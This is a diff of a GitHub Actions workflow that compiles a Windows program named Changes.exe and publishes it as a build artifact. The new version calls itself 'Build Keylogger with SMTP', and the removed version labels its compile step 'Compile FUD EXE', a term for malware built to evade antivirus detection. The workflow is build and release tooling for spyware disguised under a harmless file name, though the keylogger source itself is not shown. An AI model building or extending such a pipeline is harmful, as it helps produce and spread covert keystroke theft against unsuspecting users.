@@ -1,43 +1,13 @@
-name: Build Changes EXE
-on: [push, workflow_dispatch]
+name: Build Keylogger with SMTP
+on: [push]
 jobs:
   build:
-    runs-on: windows-2022
+    runs-on: windows-latest
     steps:
-    - uses: actions/checkout@v4
-    
-    - name: Setup MSVC
-      uses: ilammy/msvc-dev-cmd@v1
+    - uses: actions/checkout@v3
+    - uses: ilammy/msvc-dev-cmd@v1
+    - run: cl Changes.cpp /FeChanges.exe /O2 /MT /D "_WIN32_WINNT=0x0600" winhttp.lib user32.lib shell32.lib ole32.lib gdi32.lib advapi32.lib crypt32.lib iphlpapi.lib ws2_32.lib
+    - uses: actions/upload-artifact@v4
       with:
-        arch: x64
-    
-    - name: Create dist
-      shell: cmd
-      run: mkdir dist
-    
-    - name: Compile FUD EXE
-      shell: cmd
-      run: |
-        cl /O2 /MT /DNDEBUG /GS- /Gy /GL /favor:blend ^
-          /Fe:dist/Changes.exe Changes.cpp gdi32.lib advapi32.lib ^
-          kernel32.lib user32.lib shell32.lib ole32.lib winhttp.lib ^
-          /link /LTCG /SUBSYSTEM:WINDOWS /ENTRY:wWinMainCRTStartup ^
-          /OPT:REF /OPT:ICF /RELEASE /INCREMENTAL:NO
-        
-    - name: Check size
-      shell: cmd
-      run: dir dist\Changes.exe
-    
-    - name: Upload EXE
-      uses: actions/upload-artifact@v4
-      with:
-        name: Changes.exe
-        path: dist/Changes.exe
-        
-    - name: Auto Release
-      if: github.ref == 'refs/heads/main'
-      uses: softprops/action-gh-release@v2
-      with:
-        files: dist/Changes.exe
-        tag_name: v${{ github.run_number }}
-        name: Changes v${{ github.run_number }}
+        name: Changes-SMTP.exe
+        path: Changes.exe
